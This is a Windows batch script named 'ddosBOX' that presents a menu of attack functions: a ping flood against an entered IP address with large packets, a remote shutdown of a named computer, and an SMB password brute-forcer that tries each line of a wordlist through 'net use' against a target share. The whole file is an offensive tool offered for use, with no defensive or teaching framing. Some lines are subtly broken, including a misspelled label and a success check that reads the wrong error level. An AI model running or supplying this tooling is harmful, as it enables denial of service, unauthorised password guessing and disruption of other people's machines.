@echo off
title ddosBOX - adixon23w
mode 75, 30
chcp 65001 >nul
call powershell exit >nul
color b
cd files
:menu
set ip=""
cls
echo.
type "banner.txt"
echo.
echo.
echo.        Menu
echo.      ---------
echo.     1) Local IP
echo.     2) SBM-BruteForce
echo.     3) DDOS
echo.     4) Exit
echo.
set /p input=
if /I "%input%" EQU "1" goto localip
if /I "%input%" EQU "2" goto SBM
if /I "%input%" EQU "4" exit
if /I "%input%" EQU "3" goto ddos


:ddos
cls
type "banner.txt"
set/p ip=Enter IP:
cls
type "banner.txt"
set/p mb=Enter how much Mb:
ping  -l %mb% %ip% -t


:localip
cls
type "banner.txt
echo.
echo.
echo.         Local
echo.       ---------
echo.     1) Turn Off Computer
echo.     2) Exit
echo.
set /p input1=
if /I "%input1%" EQU "1" goto turnoff
if /I "%input1%" EQU "2" goto menu



:turnoff
cls
type "banner.txt"
set /p comp=Enter computer name:
shutdown /s /m \\%comp% /t 0
pause
goto loaclip


:SBM
cls
type "banner.txt"
set /p ip="Enter IP Address: "
cls
type "banner.txt"
set /p user="Enter Username: "
cls
type "banner.txt"
set /p wordlist="Enter Password List: "
cls
type "banner.txt"
set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
timeout 3> NUL
goto menu


:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
timeout 3> NUL
goto menu

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

